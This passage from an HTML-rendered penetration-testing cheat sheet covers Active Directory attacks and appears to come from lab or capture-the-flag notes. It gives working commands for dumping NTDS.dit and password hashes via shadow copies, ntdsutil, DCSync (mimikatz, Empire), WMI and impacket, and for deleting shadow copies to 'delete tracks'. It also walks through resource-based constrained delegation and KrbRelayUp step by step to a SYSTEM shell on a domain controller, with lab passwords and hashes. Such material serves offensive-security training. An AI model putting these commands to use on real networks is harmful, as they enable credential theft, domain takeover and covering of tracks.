C:\Windows\system32&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM c:\Extract\SYSTEM

# Delete tracks
C:\Windows\system32&gt; vssadmin delete shadows /shadow={uuid}

# Trick if you are on a semi-interactive shell
# You can specify /quiet option to not get the prompt
# Can be usefull for deletion (as it require to confirm)
vssadmin delete shadows /shadow={uuid} /quiet

</code></pre>
<h5 id="ntdsutil-tool"><a class="header" href="#ntdsutil-tool">ntdsutil tool</a></h5>
<pre><code># ntdsutil is a builtin tool used to manage the AD
# You can abuse it and create a backup of the ntds.dit file
ntdsutil
activate instance ntds
ifm
create full C:\ntdsutil
quit
quit

</code></pre>
<h5 id="dc-sync--mimikatz"><a class="header" href="#dc-sync--mimikatz">DC Sync / Mimikatz</a></h5>
<pre><code># DC Sync is a less noisy way to extract users informations
# It uses the DRS (Directory Replication Service)

# Classic
mimikatz # lsadump::dcsync /domain:domain.lan /all /csv

# Specific user
mimikatz # lsadump::dcsync /domain:domain.lan /user:test

</code></pre>
<h5 id="powersploit"><a class="header" href="#powersploit">PowerSploit</a></h5>
<pre><code># PowerSploit contains a script using the volume shadow copy service
Import-Module .\VolumeShadowCopyTools.ps1
New-VolumeShadowCopy -Volume C:\
Get-VolumeShadowCopy 

# Also possible through a meterpreter session
powershell_shell
New-VolumeShadowCopy -Volume C:\
Get-VOlumeShadowCopy

</code></pre>
<h5 id="invoke-dcsync"><a class="header" href="#invoke-dcsync">Invoke-DCSync</a></h5>
<pre><code># Powershell script
# Leverages PowerView, Invoke-ReflectivePEInjection and a DLL wrapper of PowerKatz
Invoke-DCSync

# Get other format (user:id:lm:ntlm)
Invoke-DCSync -PWDumpFormat

# It is also possible through a meterpreter session

</code></pre>
<h5 id="nishang"><a class="header" href="#nishang">Nishang</a></h5>
<pre><code># Nishang is a post exploitation framework allowing attacker to perform attacks
# You can use the Copy-VSS script to get NTDS.dit, SAM and SYSTEM files
Import-Module .\Copy-VSS.ps1
Copy-VSS
Copy-VSS -DestinationDir C:\ShadowCopy\

# You can also use them throught a meterpretrer session by loading the powershell extension
load powershell
powershell_import /root/Copy-VSS.ps1
powershell_execute Copy-VSS

# Also possible to establish a direct connection
powershell_shell
PS &gt; Copy-VSS
PS &gt; Copy-VSS -DestinationDir C:\Ninja

</code></pre>
<h3 id="remote-extraction"><a class="header" href="#remote-extraction">Remote Extraction</a></h3>
<h5 id="crackmapexec"><a class="header" href="#crackmapexec">CrackMapExec</a></h5>
<pre><code>crackmapexec xxx.xxx.xxx.xxx -u login -p password -d domain --ntds drsuapi
</code></pre>
<h5 id="wmi---remote"><a class="header" href="#wmi---remote">WMI - Remote</a></h5>
<pre><code># It is possible to remotely extract the NTDS database using WMI and VSSADMIN
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c vssadmin create shadow /for=C: 2&gt;&amp;1"
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2&gt;&amp;1"
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2&gt;&amp;1"

</code></pre>
<h4 id="impacket"><a class="header" href="#impacket">Impacket</a></h4>
<pre><code>
python secretsdump.py -history -user-status -just-dc-user Administrateur -just-dc-ntlm foo.local/administrateur:P4ssw0rd\!@DC1.FOO.LOCAL

python secretsdump.py -history -user-status -just-dc-user krbtgt -just-dc-ntlm foo.local/administrateur:P4ssw0rd\!@DC1.FOO.LOCAL



</code></pre>
<h5 id="ntds-extraction-and-analysis"><a class="header" href="#ntds-extraction-and-analysis">NTDS Extraction and analysis</a></h5>
<pre><code># Impacket provides a usefull script to do that (decrypt copied files)
impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit DOMAIN

# Also possible to dump it remotely by using the computer account and its hash
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1

# Extraction is also possible using NTDSDumpEx
NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive

# Or adXtract
./adXtract.sh /root/ntds.dit /root/SYSTEM pentestlab

</code></pre>
<h5 id="empire-1"><a class="header" href="#empire-1">Empire</a></h5>
<pre><code># Empire has 2 modules you can use to retrieve hashes through DCSync
usemodule credentials/mimikatz/dcsync_hashdump
usemodule credentials/mimikatz/dcsync

</code></pre>
<h3 id="resource-based-constrained-delegation"><a class="header" href="#resource-based-constrained-delegation">Resource Based Constrained Delegation</a></h3>
<p>Let's use our access with the <code>l.livingstone</code> account to create a new machine account on the domain. We can do with by using <code>impacket-addcomputer</code>.</p>
<pre><code>┌──(kali㉿kali)-[~]
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.120.181 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
</code></pre>
<p>Another Example of this:</p>
<pre><code>addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 
$DomainController -domain-netbios $DOMAIN 'domain/user:password'

python3 addcomputer.py -computer-name 'evilcom$' -computer-pass password -dc-ip 10.10.11.174 support/support:Ironside47pleasure40Watchful
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] No DC host set and 'support' doesn't look like a FQDN. DNS resolution of short names will probably fail.
[*] Successfully added machine account evilcom$ with password password.
</code></pre>
<p>We can verify that this machine account was added to the domain by using our <code>evil-winrm</code> session from before.</p>
<pre><code>*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; get-adcomputer attack


DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local
DNSHostName       :
Enabled           : True
Name              : ATTACK
ObjectClass       : computer
ObjectGUID        : 3fe60405-3692-4de9-8a20-917b234741b9
SamAccountName    : ATTACK$
SID               : S-1-5-21-537427935-490066102-1511301751-3601
UserPrincipalName :
</code></pre>
<p>With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of <a href="https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py">rbcd.py</a> and use it to set <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on our new machine account.</p>
<pre><code>┌──(kali㉿kali)-[~]
└─$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  
...
┌──(kali㉿kali)-[~]
└─$ sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                  
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$
[*] Initializing LDAP connection to 192.168.120.181
[*] Using resourced\l.livingstone account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
[*] Delegation rights modified succesfully!
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
</code></pre>
<p>Another example of this:</p>
<pre><code>./rbcd.py -f EVILCOM -t DC -dc-ip 10.10.11.174 support\\support:Ironside47pleasure40Watchful

</code></pre>
<p>We can confirm that this was successful by using our <code>evil-winrm</code> session.</p>
<pre><code>*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity

Path Owner                  Access
---- -----                  ------
     BUILTIN\Administrators resourced\ATTACK$ Allow
</code></pre>
<p>We now need to get the administrator service ticket. We can do this by using <code>impacket-getST</code> with our privileged machine account.</p>
<pre><code>┌──(kali㉿kali)-[~]
└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.120.181
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
</code></pre>
<p>Another example of this:</p>
<pre><code>python3 getST.py -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support/EVILCOM$:password

</code></pre>
<p>Time Error</p>
<pre><code>If you get this:
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

Do this:

rdate -n $ip

</code></pre>
<p>This saved the ticket on our Kali host as <strong>Administrator.ccache</strong>. We need to export a new environment variable named <code>KRB5CCNAME</code> with the location of this file.</p>
<pre><code>┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=./Administrator.ccache

or this:

export KRB5CCNAME=`pwd`/Administrator.ccache
</code></pre>
<p>Now, all we have to do is add a new entry in <strong>/etc/hosts</strong> to point <code>resourcedc.resourced.local</code> to the target IP address and run <code>impacket-psexec</code> to drop us into a system shell.</p>
<pre><code>┌──(kali㉿kali)-[~]
└─$ sudo sh -c 'echo "192.168.120.181 resourcedc.resourced.local" &gt;&gt; /etc/hosts'

┌──(kali㉿kali)-[~]
└─$ sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.120.181 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file zZeQFeGQ.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service rEwK on resourcedc.resourced.local.....
[*] Starting service rEwK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.
 
C:\Windows\system32&gt; whoami
nt authority\system

C:\Windows\system32&gt; 
</code></pre>
<p>Another example of this:</p>
<pre><code>python3 psexec.py -k DC.support.htb
</code></pre>
<h3 id="krbrelayup"><a class="header" href="#krbrelayup">KrbRelayUp</a></h3>
<p>https://wwwgeneral.github.io/posts/from-unprivileged-user-to-system-krbrelayup/</p>
<p>https://arz101.medium.com/vulnlab-bruno-f0129f60ac40</p>
<p>https://github.com/Dec0ne/KrbRelayUp</p>
<p>https://vulndev.io/cheats-windows/</p>
<pre><code>Did this on Vulnlab Bruno

cme ldap bruno.vl -u 'svc_scan' -p 'Sunshine1' -M maq
cme ldap bruno.vl -u 'svc_scan' -p 'Sunshine1' -M ldap-checker


.\KrbRelayUp.exe full -m shadowcred -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3} -p 1024

Rubeus.exe asktgt /user:brunodc$ /certificate:MIIKSAIBAzCCCgQGC...snip.... /password:tV0-oN8$aB7- /enctype:AES256 /nowrap

cat temphash | base64 -d &gt; bruno_ticket.kirbi 
python3 ticketConverter.py bruno_ticket.kirbi bruno_ticket.ccache


secretsdump.py 'brunodc$'@brunodc.bruno.vl -k -no-pass

evil-winrm -i $ip -u administrator -H '13735c7d60b417421dc6130ac3e0bfd4'


.\KrbRelayUp.exe full -m rbcd -c -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3} -p 10246

getST.py -impersonate 'administrator' bruno.vl/'KRBRELAYUP$':'uM3@eO8=cF9@rT7-' -spn HOST/BRUNODC

smbexec.py administrator@brunodc -k -no-pass


</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>

        <!-- Livereload script (if served using the cli tool) -->
        <script>
            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
            const socket = new WebSocket(wsAddress);
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload();
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>



        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>

    </div>
    </body>
</html>
